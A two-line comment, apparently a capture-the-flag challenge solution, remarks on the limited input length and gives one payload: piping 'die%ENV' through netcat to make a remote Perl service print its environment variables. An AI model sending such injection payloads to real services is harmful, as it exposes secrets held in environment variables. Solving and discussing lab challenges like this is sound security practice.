With smaller input lengths and no return code disclosure, the ways to solve this is dramatically lower. My solution:

echo -n 'die%ENV' | nc ...

